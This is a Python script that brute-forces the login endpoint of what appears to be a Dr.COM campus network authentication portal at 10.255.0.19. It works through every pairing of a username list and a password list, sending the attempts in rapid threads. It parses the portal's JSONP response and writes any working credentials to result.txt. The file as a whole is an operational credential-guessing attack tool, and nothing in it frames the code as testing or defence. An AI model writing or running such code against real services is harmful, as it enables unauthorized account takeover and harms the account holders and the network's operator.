import json
import re
import threading
import time
import requests

file1 = open('username.txt', mode='r', encoding='utf-8')
file2 = open('password.txt', mode='r', encoding='utf-8')


def dump_username():
    dic_username = file1.readlines()
    for i in range(len(dic_username)):
        dic_username[i] = dic_username[i].strip('\n')
    return dic_username


def dump_password():
    dic_password = file2.readlines()
    for i in range(len(dic_password)):
        dic_password[i] = dic_password[i].strip('\n')
    return dic_password


def brute(session, username: str, password: str):
    url = 'http://10.255.0.19/drcom/login?callback=dr1003&DDDDD=' + username + '&upass=' + password + '&0MKKey=123456&R1=0&R3=0&R6=0&para=00&v6ip=&v='
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
               'Referer': 'http://10.255.0.19/a79.htm'}
    r = session.get(url=url, headers=headers, verify=False)
    print(str(r.status_code) + '\t' + str(len(r.text)) + '\t' +
          username + '\t' + password + '\t', end='\t')
    # print(r.text)
    s = re.findall(r'\((.*?)\)', r.text)
    j = json.loads(s[0])
    status = j['result']
    print(status)
    if status == 1:
        with open('result.txt', mode='a+') as f:
            f.write(username + '\t' + password + '\n')
            session.get('http://10.255.0.19/drcom/logout?callback=dr1002&v=')


if __name__ == '__main__':
    mode = 1
    dic_username = dump_username()
    dic_password = dump_password()
    session = requests.session()
    if mode == 1:
        for username in dic_username:
            for password in dic_password:
                t = threading.Thread(target=brute, args=(session, username, password))
                t.start()
                time.sleep(0.005)
    elif mode == 2:
        for username in dic_username:
            i = 0
            for password in dic_password:
                t = threading.Thread(target=brute, args=(session, username, dic_password[i]))
                i += 1
                if i == 122:
                    for j in range(i):
                        dic_password.pop(0)
                    break
                t.start()
                time.sleep(0.005)
